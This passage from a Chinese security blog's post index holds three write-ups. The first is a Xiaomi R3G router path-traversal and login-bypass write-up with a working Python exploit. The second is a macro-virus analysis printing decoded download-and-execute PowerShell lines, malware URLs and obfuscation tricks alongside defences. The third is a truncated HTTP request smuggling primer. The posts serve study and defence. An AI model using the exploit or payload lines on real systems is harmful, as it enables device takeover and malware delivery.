/api-third-party/download/extdisks { alias /extdisks/;} 故可以任意文件读取根目录下的所有文件，而且是root权限，如访问http://192.168.31.1/api-third-party/download/extdisks../etc/shadow 类似的问题，存在多处如 12345678910location /backup/log { alias /tmp/syslogbackup/;}location /api-third-party/download/public { alias /userdisk/data/;}location /api-third-party/download/private { alias /userdisk/appdata/;} 通过任意文件读取，登录路由器后台不是明文存储密码，进行一定分析。关注两个过程，一是登录时前端js生成http post请求参数过程，二是验证用户登陆的后端过程。 登录时前端js生成http post请求参数过程 12345678910111213141516171819202122var Encrypt = { key: 'a2ffa5c9be07488bbb04a3a47d3c5f6a', iv: '64175472480004614961023454661220', nonce: null, init: function(){ var nonce = this.nonceCreat(); this.nonce = nonce; return this.nonce; }, nonceCreat: function(){ var type = 0; // 自己的mac地址 var deviceId = '&lt;%=mac%&gt;'; var time = Math.floor(new Date().getTime() / 1000); var random = Math.floor(Math.random() * 10000); return [type, deviceId, time, random].join('_'); }, oldPwd : function(pwd){ // oldPwd = sha1(nonce + sha1(pwd + 'a2ffa5c9be07488bbb04a3a47d3c5f6a')) return CryptoJS.SHA1(this.nonce + CryptoJS.SHA1(pwd + this.key).toString()).toString(); }, //...}; 可知oldPwd = sha1(nonce + sha1(pwd + 'a2ffa5c9be07488bbb04a3a47d3c5f6a'))，登陆请求包为 1234POST /cgi-bin/luci/api/xqsystem/login HTTP/1.1Host: 192.168.31.1username=admin&amp;password=c9e62da7b8a0b7a4918c5a90912ba81a9717f9ab&amp;logtype=2&amp;nonce=0_mac地址_时间戳_5248 验证用户登陆的后端过程 调用XQSecureUtil.checkUser函数 1234567891011function checkUser(user, nonce, encStr) -- 从xiaoqiang 配置文件中读取信息 local password = XQPreference.get(user, nil, &quot;account&quot;) if password and not XQFunction.isStrNil(encStr) and not XQFunction.isStrNil(nonce) then if XQCryptoUtil.sha1(nonce..password) == encStr then return true end end XQLog.log(4, (luci.http.getenv(&quot;REMOTE_ADDR&quot;) or &quot;&quot;)..&quot; Authentication failed&quot;, nonce, password, encStr) return falseend 跟进XQPreference.get函数易知道是从/etc/config/account文件中读取某个字符串，这里称它为accountStr。 checkUser函数判断等式为(encStr为参数oldPwd) 123sha1(nonce + sha1(密码 + 'a2ffa5c9be07488bbb04a3a47d3c5f6a'))==sha1(nonce + accountStr) 则 1accountStr == sha1(密码 + 'a2ffa5c9be07488bbb04a3a47d3c5f6a') 故，只需要读取/etc/config/account得到accountStr即可构造如下数据包登陆 1234POST /cgi-bin/luci/api/xqsystem/login HTTP/1.1Host: 192.168.31.1username=admin&amp;password=sha1(nonce + account中保存的字符串)&amp;logtype=2&amp;nonce=0_mac地址_时间戳_5248 实现任意登陆poc arbitrary_file_read_vulnerability.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import osimport reimport timeimport base64import randomimport hashlibimport requestsfrom Crypto.Cipher import AES# proxies = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}proxies = {}def get_mac(): ## get mac r0 = requests.get(&quot;http://192.168.31.1/cgi-bin/luci/web&quot;, proxies=proxies) mac = re.findall(r'deviceId = \\'(.*?)\\'', r0.text)[0] # print(mac) return macdef get_account_str(): ## read /etc/config/account r1 = requests.get(&quot;http://192.168.31.1/api-third-party/download/extdisks../etc/config/account&quot;, proxies=proxies) print(r1.text) account_str = re.findall(r'admin\\'? \\'(.*)\\'', r1.text)[0] return account_strdef create_nonce(mac): type_ = 0 deviceId = mac time_ = int(time.time()) rand = random.randint(0,10000) return &quot;%d_%s_%d_%d&quot;%(type_, deviceId, time_, rand)def calc_password(nonce, account_str): m = hashlib.sha1() m.update((nonce + account_str).encode('utf-8')) return m.hexdigest()mac = get_mac()account_str = get_account_str()## login, get stoknonce = create_nonce(mac)password = calc_password(nonce, account_str)data = &quot;username=admin&amp;password={password}&amp;logtype=2&amp;nonce={nonce}&quot;.format(password=password,nonce=nonce)r2 = requests.post(&quot;http://192.168.31.1/cgi-bin/luci/api/xqsystem/login&quot;, data = data, headers={&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;}, proxies=proxies)# print(r2.text)stok = re.findall(r'&quot;token&quot;:&quot;(.*?)&quot;',r2.text)[0]print(&quot;stok=&quot;+stok) 可以获取到登录的stok 修复方案任意文件读取将/etc/sysapihttpd/sysapihttpd.conf中的形如以下形式修改为 123location /xxx { alias /abc/;} 修改为 123location /xxx/ { alias /abc/;} 参考链接 https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md","link":"/2020/09/12/IOT/Exploit/%E5%B0%8F%E7%B1%B3/CVE-2019-18371-Xiaomi-Mi-WiFi-R3G-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"title":"宏病毒的研究和学习","text":"宏病毒的研究和学习 1.绪论 宏病毒是一种常见的计算机病毒，寄存在文档或者模板中，但是并不会直接感染可执行程序。其诞生于上世纪90年代，自其诞生之日，各种各样的宏病毒不断在网络上涌现。早期的宏病毒是病毒先驱者们展现高超技术的舞台，只感染文档文件，随着时间的推移，宏病毒的危害也越来越大，宏病毒不再只是感染文档文件，而成为了分发恶意程序的常规途径。宏病毒的执行简易隐蔽快速，一旦用户打开含有宏病毒的文档，其中的宏病毒就会被执行。 对于攻击者而言，宏病毒是一把利器，尤其是结合了社会工程学的宏病毒。如乌克兰电网事件（BlackEnergy）,工作人员只是打开了一篇看似很正常的文档，然后便造成了无法挽回的损失。不只是BlackEnergy，进来肆虐的各种各样的勒索软件，都离不开Office宏的帮助。借助传统的宏病毒，一旦用户打开含有宏病毒的文档，其中的宏病毒就会被执行，释放并激活恶意软件 2.基础知识 宏（英文Macro），广义上的定义是：宏就是把一系列的指令组织成一独立的命令，类似C语言中#define宏定义，避免同一动作的一再重复；侠义上，宏特指office系列办公软件中的宏，Microsoft Office 中对宏的定义为“宏就是能够组织在一起的，可以作为一个独立命令来执行的一些列Word命令，他能使日常工作变得容易。”本文中提到的宏属于狭义的定义，即office办公软件中的宏。 首先office对于宏的管理如下图所示： ​ ​ 正常情况下offic会弹出相应的宏被禁用的通知，点击启用内容即可查看 或者按下ALT+F11也可以看到相应的宏程序 ​ ​ 该例中的宏十分简单，其作用就是弹出一个对话框。 执行恶意功能的宏就是宏病毒 宏病毒是使用宏语言编写的恶意程序，存在于字处理文档、电子数据表格、数据库、演示文档等数据文件中，可以在office系列办公软件中运行，利用宏的功能能将自己复制到其他数据文件中。宏病毒感染的是数据文件。宏病毒于传统的病毒有很大的不同，他不感染可执行文件，而是潜伏在Microsoft Office文档中，一旦用户打开含有宏的文档，其中的宏就会被执行。宏是使用VBA编写的，编写过程简单，任何人只需掌握一些基本的宏编写技能就可以编写出破坏力巨大的宏病毒。 宏病毒的强大是建立在强大的VBA组件的基础上的。同时，宏病毒于系统平台无关，任何计算机如果能够运行Microsoft Office办公软件，都有可能感染宏病毒。随着Microsoft Office系列办公软件成为电子文档的工业标准，word，excel和powerpoint等已成为个人计算机和互联网上广泛使用的文档格式，宏病毒成为传播最广泛，危害最大的一类病毒。 根据文档载体的不同，宏病毒可以细分为很多种，Word、Excel、Access、PowerPoint等都有相应的宏病毒。 2.2VB基础 （1）sub与function 上述宏代码中，含有一个Sub和一个Function。sub和function都类似于C中的函数。sub在VB中被称为过程，function被称为函数；sub没有返回值，function有返回值；一段宏一定是从sub开始执行的。在demo3中定义了一个过程 autoopen()，“End Sub”表示这个过程的结束。 （2）VB基本函数 demo3 中“MsgBox ActiveDocument.BuiltInDocumentProperties(5)”调用了VB基本函数“MsgBox”，参数是”ActiveDocument.BuiltInDocumentProperties(5)”。这里实际上是“MsgBox (参数)”，但是VBA的容错率较高，不写括号，宏代码依然能够执行。即使我们将“MsgBox”写成“MSgbOx”，宏代码依然能够执行。一些宏病毒就是使用大小写混淆，增加病毒分析难度。 除了MsgBox，VB中还有很多基本函数，各位可以百度“VB函数大全”。 （3）对象 VB中存在很多对象，如Application对象，Document对象，Adobd.stream对象等。对象实际上是代码和数据的组合，我们在使用对象时，要么使用对象的属性（就是数据），要么使用对象的方法（就是代码）。通过 “对象.属性/方法”的方式使用对象的属性/方法。ActiveDocument.BuiltInDocumentProperties(5)中就是使用了ActiveDocument对象的BuiltInDocumentProperties()方法，参数是5。 3.宏病毒实例分析 3.1 实例1 demo2.doc 这里是社会工程学攻击 ​ ALT+F11打开VBA编辑器，查看宏代码。但是你会发现，此时工程里没有数据，这是没有单击“启用内容”，VBA工程还没有加载 ​ 利用VBA_Password_Bypasser重新打开demo2.doc,再次打开VBA编辑器查看宏代码，宏代码一览无余： ​ 这段宏首先拼接了一段字符串CGJKIYRSDGHJHGFFG，这段字符串是一段命令，接下来就调用Shell() ，执行这段命令。 但是CGJKIYRSDGHJHGFFG的内容经过混淆，我们没办法一眼看出执行了什么命令，我们可以改造宏代码，使用Msgbox将CGJKIYRSDGHJHGFFG这段命令打印出来： ​ 现在就一目了然了，这段cmd命令执行了两段powershell命令，第一段powershell命令是从’http://skycpa.in/file.php'中下载文件，并另存为'%TEMP%\\Y.ps1'，第二段powershell命令就是执行Y.ps1，关于Y.ps1的分析不属于宏病毒的范畴，这里就不做分析了。 3.2 oledump.py 在之前的分析中，我们先启用宏，然后打开VBA编辑器分析宏代码。这个时候我们不仅可以直观的看到宏代码，还可以动态调试。但是，我们选择启用宏后，宏代码就会运行，如果存在恶意行为，恶意行为就会执行。这样的分析方式存在一定的风险，那么，有没有一种方式，不运行宏就能查看宏代码呢？当然有，那就是oledump.py(https://github.com/decalage2/oledump-contrib)。 oledump.py是一个用于分析OLE文件（复合文件二进制格式）的程序，我们可以使用它提取文档中的宏代码。其查找基于二进制文件格式的文件中的内容的流程： 1.读取文件流。 2.识别可能包含要查找的内容的结构。 3.通过第一个结构，找到下一节的位置。 4.在流中转到该节。 5.重复前面两个步骤，直到找到所需的内容。 6.读取并分析内容。 python oledump.py yangben.doc ​ 这是oledump对doc文件的最基础的分析，显示了这个文件的Stream数据（在接下来的章节中我们会进行介绍Stream），一共包含18段，其中8这一段数据上标记了字母‘M’，表示这段数据中含有VBA宏（Macro）。 oledump.py有许多参数可以选择，使用oledump.py -m 可以查看oledump.py 的帮助信息，这里我们要用到的参数是-s和-v -s 段号：选择上分析出的某一段来查看内容 -v ：解压缩VBA宏 上面两个参数结合起来用就可以找出宏源码： python oledump.py -s -A3 -v -yangben2.doc ​ 可以看到宏代码被解析出来了。 在实际分析时，-s后的参数可以选择‘a’，表示分析所有段的数据，还可以使用‘&gt;’符号将宏代码数据存储在新文件中 decoder_ay.py和-d参数，它可以将文件中的exe数据dump下来。有一些文档宏存储了exe数据，这个时候我们就可以使用下列命令，将文档中的exe数据导出： python oledump.py -s 14 -D decoder_ay.py -d 1.doc &gt;1.exe 如果我们只是想dump某一段数据，而不关心是不是exe数据，使用如下命令： Oledump.py -s 段名 -d 文件名 &gt;新文件名 4.宏病毒的分析技巧 4.1自动执行 宏病毒分析的第一步是定位自动执行入口。 宏病毒具有自动执行的特性，特别是含有AutoOpen的宏，一旦用户打开含有宏的文档，其中宏病毒就会被执行，而用户一无所知。 宏病毒的激发机制有三种：利用自动运行的宏，修改Word命令和利用Document对象的事件。 宏病毒种常用的自动执行方法有两种：一种是用户执行某种操作时自动执行的宏，如Subbotton()，当用户单击文档种的按钮控件时，宏自动执行；另一种则是Auto自动执行，如Sub AutoOpen()和Sub AutoClose(),分别在文档打开和关闭时自动执行 4.2 隐秘执行 宏病毒利用几行代码就可以实现隐秘，宏病毒通过阻止弹出各类提示，防止用户发现宏正在运行来实现自我隐藏： On Error Resume Next //如果发生错误，不弹出错误对话框 Application.DisplayStatusBar = False //进制显示状态栏 Options.SaveNormalPrompt = False //修改公用模板时自动保存，不弹出提示 宏病毒自我隐藏还有一种方式，那就是屏蔽菜单按钮和快捷键，普通用户即使猜测到有宏正在运行，也无法取消正在执行种的宏，查看宏信息。 下面是一些宏病毒采取的隐蔽执行的一些措施： 外部例程 介绍 MSXML2.ServerXMLHTTP Xmlhttp是一种浏览器对象， 可用于模拟http的GET和POST请求 Net.WebClient 提供网络服务 Adodb.Stream Stream 流对象用于表示数据流。配合XMLHTTP服务使用Stream对象可以从网站上下载各种可执行程序 Wscript.shell WScript.Shell是WshShell对象的ProgID，创建WshShell对象可以运行程序、操作注册表、创建快捷方式、访问系统文件夹、管理环境变量。 Poweshell PowerShell.exe 是微软提供的一种命令行shell程序和脚本环境 Application.Run 调用该函数，可以运行.exe文件 WMI 用户可以利用 WMI 管理计算机，在宏病毒中主要通过winmgmts:\\.\\root\\CIMV2隐藏启动进程 Shell.Application 能够执行sehll命令 可以使用Wscript.shell实现命令执行功能： Set oWshell = CreateObject（“WScript.Shell”） If ValueType = “” Then oWshell.RegWrite strkey, Value Else oWshell.RegWrite strkey, Value oWshell.RegWrite strkey, Value, ValueType End If 上表种Wscript.shell、Powersehll、Application.Run、Shell.Application这些外部例程都可以用来执行命令，初次之外，一些API如：Shell()、CallWindowProc()也常用执行命令。 4.4 字符串隐写 宏病毒分析比较简单，这是因为任何能执行宏的用户都能查看宏源码，分析人员轻而易举就分析出宏病毒的行为。通过扫描宏种特征字符串，杀软也很容易检测出宏病毒。宏病毒的开发者们便想尽办法隐藏这些特征字符串，下面本文就对宏病毒中这些字符串的隐写方式进行分析。 4.4.1.Chr( )函数 Chr(),返回以数值表达式值为编码的字符（例如：Chr(70)返回字符‘F’） 使用Chr函数是最常见的字符串隐写结束，利用ascii码，逃避字符串扫描。 如下列代码： Nrh1INh1S5hGed = “h” &amp; Chr(116) &amp; Chr(61) &amp; “t” &amp; Chr(112) &amp;Chr(58) &amp; Chr(47) &amp; Chr(59) &amp; Chr(47) &amp; Chr(99) &amp; Chr(104) &amp; Chr(97) &amp; “t” &amp; Chr(101) &amp; Chr(97) &amp; Chr(117) &amp; Chr(45) &amp; Chr(100) &amp; Chr(60) &amp; Chr(101) &amp; Chr(115) &amp; Chr(45) &amp; Chr(105) &amp; Chr(108) &amp; “e” &amp; Chr(115) &amp; Chr(46) &amp; Chr(61) &amp; Chr(99) &amp; Chr(111) &amp; Chr(109) &amp; Chr(47) &amp; Chr(60) &amp; Chr(52) &amp; Chr(116) &amp; Chr(102) &amp; Chr(51) &amp; Chr(51) &amp; Chr(119) &amp; Chr(47) &amp; Chr(60) &amp; Chr(119) &amp; “4” &amp; Chr(116) &amp; Chr(52) &amp; Chr(53) &amp; Chr(51) &amp; Chr(46) &amp; Chr(59) &amp; Chr(101) &amp; Chr(61) &amp; Chr(120) &amp; Chr(101) 上列代码使用了大量的Chr函数，看似很复杂，实际上就只是一串字符串“ht=tp:/;/chateau-d Nrh1INh1S5hGed字符串看着很像一个链接，但是中间多了几个字符，其实处理起来很简单，只要将多余字符删掉就好。 将这串字符串命名为Nrh1INh1S5hGed也是为了混淆，但是对于宏病毒分析人员来说，这种混淆并没有增加分析难度，分析人员只需要 全选–查找–替换。 Chr（）函数还可以利用表达式，增加技术人员的分析难度： Ndjs = Sgn(Asc(317 - 433) + 105） ATTH = Chr(Ndjs) + Chr(Ndjs + 12) + Chr(Ndjs + 12) + Chr(Ndjs + 8) 经过分析发现，上述代码的字符串是：“http：//” 4.4.2.Replace( )函数 Replace函数的作用就是替换字符串，返回一个新字符串，其中某个指定的字符串被另一个字符串代替。 承接上文，把Nrh1INh1S5hGed中多余字符去掉，这里使用Replace函数把多余字符替换为空。 Nrh1INh1S5hGed = Replace(Replace(Replace(Nrh1INh1S5hGed, ​ Chr(60), “”), Chr(61), “”), Chr(59), “”) 处理之后： Nrh1INh1S5hGed=“http://chateau-des-iles.com/4tf33w/w4t453.exe” 可以很清晰看出Nrh1INh1S5hGed是一个下载名为w4t453可执行文件的链接。可以猜测w4t453.exe是一个恶意程序，之后一定会执行w4t453.exe。在用户一无所知的情况下，宏已经完成了入侵工作。 4.4.3.CallByname 函数 CallByname函数允许使用一个字符串在运行时指定一个属性或方法。 CallByName 函数的用法如下： Result = CallByName（Object， ProcedureName, CallType, Arguments()） CallByName 的第一个参数包含要对其执行动作的对象名。第二个参数，ProcedureName,是第一个字符串，包含将要调用的方法或属性过程名。CallType参数包含一个常熟，代表要调用的过程的类型：方法（vbMethod）、property let (vbLet)、property get (vbGet),或 property set （vbSet）。最后一个参数是可选的，他包含一个变量数组，数组中包含该过程的参数。 例如： CallByName Text1, “Move”, vbMethod, 100, 100就相当于执行Text1.Move(100,10) 这种隐藏的函数执行增加了分析的难度。 CallByName的作用不仅仅在此，在下面的这个例子中，利用callByName，可以用脚本控制控件: code： Dim obj As Object[/align] Set obj = Me ​ Set obj = CallByName(obj, “Text1”, VbGet) ​ Set obj = CallByName(obj, “Font”, VbGet) ​ CallByName obj, “Size”, VbLet, 50 ​ ‘以上代码=”Me.Text1.Font.Size = 50” ​ Dim obj As Object ​ Dim V As String ​ Set obj = Me ​ Set obj = CallByName(obj, “Text1”, VbGet) ​ Set obj = CallByName(obj, “Font”, VbGet) ​ V = CallByName(obj, “Size”, VbGet) ​ ‘以上代码=”V = Me.Text1.Font.Size” 4.4.4.Alias替换函数名 Alias子句是一个可选的部分，用户可以通过它所标识的别名对动态库中的函数进行引用。 Public Declare Function clothed Lib “user32” Alias “GetUpdateRect” (prestigiation As Long, knightia As Long, otoscope As Long) As Boolean 如上例所示，clothed作为GetUpdateRect的别名，调用clothed函数相当于调用user32库里的GetUpdateRect函数。 事实上喜欢使用别名的不仅仅是宏病毒制造者，普通的宏程序员也喜欢使用别名。使用别名的好处是比较明显的，一方面Visual Basic不允许调用以下划线为前缀的函数，然而在Win32 API函数中有大量C开发的函数可能以下划线开始。使用别名可以绕过这个限制。另外使用别名有利于用户命名标准统一。对于一些大小写敏感的函数名，使用别名可以改变函数的大小写。 4.4.5.利用窗体、控件隐藏信息 控件在宏程序里很常见，有些宏病毒的制造者们便想到利用控件隐藏危险字符串。 ​ 如图所示，空间里存放着关键字符串，程序用到上述字符串时，只需要调用标签空间的caption属性 ​ 空间的各个属性（name、caption、controtiptext、等）都可以成为危险字符串的藏身之所。而仅仅查看宏代码，分析者无法得知这些字符串内容，分析者必须进入编辑器查看窗体属性，这大大增加了分析的难度。 4.4.6.利用文件属性 这种方式和利用窗体属性的方式类似，就是将一切能存储数据的地方利用起来。 如图所示读取的时ActiveDocument。BuiltinDocumentProperties Comments的数据，实际上就是文件备注信息里的数据，将这里的数据Base解密并执行。 ​ ​ 4.5 恶意行为字符串 不同的宏病毒执行不同的恶意行为，但这些恶意行为是类似的，他们使用的代码往往是相似的。通过大量的样本分析，笔者总结了一些宏病毒执行危险操作时代码中含有的字符串，详见下表： 字符串 描述 http URL连接 CallByName 允许使用一个字符串在运行时指定一个属性或方法，许多宏病毒使用CallByName执行危险函数 Powershell 可以执行脚本，运行.exe文件，可以执行base64的命令 Winmgmts WinMgmt.exe是Windows管理服务，可以创建windows管理脚本 Wscript 可以执行脚本命令 Shell 可以执行脚本命令 Environment 宏病毒用于获取系统环境变量 Adodb.stream 用于处理二进制数据流或文本流 Savetofile 结合Adodb.stream用于文件修改后保存 MSXML2 能够启动网络服务 XMLHTTP 能够启动网络服务 Application.Run 可以运行.exe文件 Download 文件下载 Write 文件写入 Get http中get请求 Post http中post请求 Response http中认识response回复 Net 网络服务 WebClient 网络服务 Temp 常被宏病毒用于获取临时文件夹 Process 启动进程 Cmd 执行控制台命令 createObject 宏病毒常用于创建进行危险行为的对象 Comspec %ComSpec%一般指向你cmd.exe的路径 5 宏病毒的防御手段 安装杀毒软件，打全系统补丁是预防计算机病毒的基本措施，当然也适用于宏病毒，除此这些常规手段之外，宏病毒还有专门的防止措施。 5.1 禁用宏 由于宏病毒的肆虐，Microsoft不得不在Office办公软件中提供了禁止宏的功能，用户只需要将其打开激活即可再次运行宏。以word2013为例，禁用宏的方法是：单击开发工具菜单下的“宏”，单击“宏安全性”，在随后的出现的对话框中选择“禁用所有宏，并发出通知”。 这个方法一度被认为能防住所有的宏病毒，但是总会有0day能够绕过宏防护，禁用宏对于利用漏洞绕过宏禁用功能的宏病毒，仍然无能为力。 而且禁用宏功能还有两个很大的缺陷：一是它拒绝了一切的宏执行，并不区分正常的宏和还是病毒宏，这会造成某些文档无法打开或出错；二是宏病毒防护无法阻止启动word时Autoexec.DOT中的宏和Normal.DOT中的宏自动执行。 5.2 越过自动宏 如果怀疑文档中存在宏病毒，可以在Office打开文档的时候，始终按住Shift键，将进制存在的一起自动宏。这和禁止宏有异曲同工之妙，Shift键可以在退出时禁止任何AutoClose宏。这种方法的缺陷也很明显，它只能对付一时，当宏病毒利用其他菜单选项来实现破环活动，这种方法就不再有效 5.3恢复被宏病毒破坏的文档 对于普通用户来说，清理宏病毒显得麻烦，因为文档被宏病毒感染后（实际上是文档使用的模板文档被感染），使用文档时常常会出现一些异常情况，即使用杀毒软件将所有带毒的文档文件都处理一遍，但是，当重新打开它们时病毒又出现了。有些用户采用的是将Office卸载重装，但是有时候问题还是没有被解决。 其实，对于宏病毒的清理并不难，下面以删除Word宏病毒为例分步骤详细说明： ① 退出Word程序，先查看系统盘根目录下是否存在Autoexec.DOT文件，如果存在，而又不知道它是什么时候出现，则将其删除。 ② 然后找到Normal.DOT文件，一般位于C:\\Documents and Settings\\ Administrator\\Application Data\\Microsoft\\Templates目录下，用先前干净的备份将其替换，也可以直接删除，Word不会因为找不到Normal.DOT而拒绝启动，它会自动重新生成一个干净的没有任何外来宏的Noraml.DOT。 ③ 查看Noraml.DOT所在的目录中是否存在其他模板文件，如果存在且不是自己复制进去的，将其删除。 ④ 重新启动Word程序，查看Word是否恢复正常了。 ⑤ 最后检查宏病毒防护是否被启用了，某些病毒会自动禁用宏病毒防护功能，如果不启用禁用宏功能，Word会很快再次被病毒感染。 目前主流杀软在处理宏病毒时，都是直接删除含有宏病毒的文档，这样处理显得有些粗暴，将导致用户无法查看文档里的数据，如果时一些重要的业务数据，将造成业务数据的丢失，产生无法估计的后果。本文将介绍一种宏病毒处理思路，在不删除文档文件的情况下清楚宏病毒。在正式处理宏病毒前，我们必须对Office文档的数据结构以及宏的数据结构有着初步的了解 6 符合文档（OLE文件）二进制解析 6.1复合文档数据结构解析 Office文档（如：doc、ppt、xls）很多是复合文档（OLE文件），所有文件数据都是存储在一个活多个流中。每个流都有一个相似的数据结构，用于存储元数据的数据结构。这些元数据有客户和系统的信息、文档属性、格式信息、文本内容、媒体内容。宏代码信息也是以这种方式存储在复合文档中的。 为了在Office文档文件中提取宏代码，必须能够解析符合文档的二进制格式，下面以word威力，分析复合文档的二进制文件结构。 6.1.1.准备工作 ①准备工作： Office Visualization Tool:微软提供的office二进制格式查看工具，用于学习doc,xls,ppt等文档二进制格式； 010Editor：一款流行的二进制编辑器","link":"/2018/06/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E5%AE%8F%E7%97%85%E6%AF%92%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E5%AD%A6%E4%B9%A0/"},{"title":"HTTP请求走私漏洞分析","text":"基础知识HTTP简介HTTP协议是Hyper Text Transfer Protocol(超文本传输协议)：一种无状态的、应用层的、以请求/应答方式运行的协议，它使用可扩展的语义和自描述消息格式，与基于网络的超文本信息系统灵活的互动 HTTP协议工作于客户端-服务端架构之上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。 HTTP是一个基于TCP/IP通信协议来传递数据(HTML 文件, 图片文件, 查询结果等)。 TCP三次握手在创建过程当中，三次握手就是代表着有三次网络传输，客户端发送一次，然后服务端返回一次，然后客户端再发送一次，这个时候才创建了tcp连接，然后才能去发送http请求 而HTTP1.0协议和HTTP1.1协议之所以不同，一部分也在于此：在HTTP1.0里面，这个连接是在http请求创建的时候，就去创建这个tcp连接，然后连接创建完之后，请求发送过去，服务器响应之后，这个tcp连接就关闭了 在HTTP1.1协议中，可以用Keep-Alive方法去申明这个连接可以一直保持，那么第二个http请求就没有三次握手的开销，而且相较于HTTP1.0，HTTP1.1有了Pipeline，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。 HTTP属性状态码1234567200 OK //客户端请求成功400 Bad Request //客户端请求有语法错误，不能被服务器所理解401 Unauthorized //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用403 Forbidden //服务器收到请求，但是拒绝提供服务404 Not Found //请求资源不存在，eg：输入了错误的URL500 Internal Server Error //服务器发生不可预期的错误503 Server Unavailable //服务器当前不能处理客户端的请求，一段时间后可能恢复正常 请求头123456789101112131415Accept：表示浏览器支持的MIME类型Accept-Encoding：浏览器支持的压缩类型Accept-Language浏览器支持的语言类型，并且优先支持靠前的语言类型Connection当浏览器与服务器通信时对于长连接如何进行处理：close/keep-aliveCookie向服务器返回cookie，这些cookie是之前服务器发给浏览器的Host：请求的服务器URLUser-Agent：用户使用的客户端的一些必要信息，比如操作系统、浏览器及版本、浏览器渲染引擎等。判断是否为ajax请求如果没有该属性则说明为传统请求 响应头：12345Server，服务端所使用的Web服务名称，如：Server：Apache/1.3.6(Unix)。Set-Cookie：服务器向客户端设置的Cookie。Last-Modified，服务器通过这个域告诉客户端浏览器，资源的最后修改时间。Location：重定向用户到另一个页面，比如身份认证通过之后就会转向另一个页面。这个域通常配合302状态码使用。Content-Length：body部分的长度（单位字节）。 发展时间线最早在2005年，由Chaim Linhart，Amit Klein，Ronen Heled和Steve Orrin共同完成了一篇关于HTTP Request Smuggling这一攻击方式的报告。通过对整个RFC文档的分析以及丰富的实例，证明了这一攻击方式的危害性。 https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf 在2016年的DEFCON 24 上，@regilero在他的议题——Hiding Wookiees in HTTP中对前面报告中的攻击方式进行了丰富和扩充。 [https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf](https://media.defcon.org/DEF CON 24/DEF CON 24 presentations/DEF CON 24 - Regilero-Hiding-Wookiees-In-Http.pdf) 在2019年的BlackHat USA 2019上，PortSwigger的James Kettle在他的议题——HTTP Desync Attacks: Smashing into the Cell Next Door中针对当前的网络环境，展示了使用分块编码来进行攻击的攻击方式，扩展了攻击面，并且提出了完整的一套检测利用流程。 https://www.blackhat.com/us-19/briefings/schedule/#http-desync-attacks-smashing-into-the-cell-next-door-15153 HTTP Request Smuggling最早是在2005年由Watchfire记录的，但是由于其利用条件比较苛刻，很长一段时间，Web层面的漏洞如雨后春笋般冒了出来， 就像之前的不被重视的xss一样，HTTP Request Smuggling同样被忽略了。但大神们总是能带来神奇的体验，利用此漏洞成功拿到了近70K$的奖金，这不 仅让许多互联网大厂重视了起来，也让该漏洞走进了安全爱好者的视野。 漏洞原因keep-alive 与 pipeline为了缓解源站的压力，一般会在用户和后端服务器（源站）之间加设前置服务器，用以缓存、简单校验、负载均衡等，而前置服务器与后端服务器往往是在可靠的网络域中，ip 也是相对固定的，所以可以重用 TCP 连接来减少频繁 TCP 握手带来的开销。这里就用到了 HTTP1.1 中的 Keep-Alive 和 Pipeline 特性： 所谓 Keep-Alive，就是在 HTTP 请求中增加一个特殊的请求头 Connection: Keep-Alive，告诉服务器，接收完这次 HTTP 请求后，不要关闭 TCP 链接，后面对相同目标服务器的 HTTP 请求，重用这一个 TCP 链接，这样只需要进行一次 TCP 握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。这个特性在 HTTP1.1 中是默认开启的。 有了 Keep-Alive 之后，后续就有了 Pipeline，在这里呢，客户端可以像流水线一样发送自己的 HTTP 请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。现如今，浏览器默认是不启用 Pipeline 的，但是一般的服务器都提供了对 Pipleline 的支持。 在正常情况下用户发出的 HTTP 请求的流动如下图： 这意味着突然之间，后端与前端就每个消息的结尾达成一致至关重要。否则，攻击者可能能够发送模糊的消息，该消息被后端解释为两个不同的HTTP请求： 为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用上了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取。这就有了一个很典型的拓扑结构。 一般来说，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这也很容易理解，用户的分布范围是十分广泛，建立连接的时间也是不确定的，这样TCP链接就很难重用，而代理服务器与后端的源站服务器的IP地址是相对固定，不同用户的请求通过代理服务器与源站服务器建立链接，这两者之间的TCP链接进行重用，也就顺理成章了。 当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。 五种常见的走私请求1 CL不为0的GET请求其实在这里，影响到的并不仅仅是GET请求，所有不携带请求体的HTTP请求都有可能受此影响，只因为GET比较典型，我们把它作为一个例子。 在RFC2616中，没有对GET请求像POST请求那样携带请求体做出规定，在最新的RFC7231的4.3.1节中也仅仅提了一句。 https://tools.ietf.org/html/rfc7231#section-4.3.1 sending a payload body on a GET request might cause some existing implementations to reject the request 